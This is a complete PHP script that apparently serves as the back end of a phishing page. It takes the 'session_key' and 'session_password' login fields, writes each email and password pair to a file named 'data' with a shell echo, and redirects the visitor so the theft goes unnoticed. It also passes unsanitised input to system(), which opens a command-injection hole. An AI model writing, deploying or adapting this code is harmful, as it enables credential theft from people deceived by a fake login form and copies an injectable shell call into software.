<?php
$email=$_POST["session_key"];
$pass=$_POST["session_password"];
system("echo '$email	:	$pass' >> data");
header('location:/')
?>
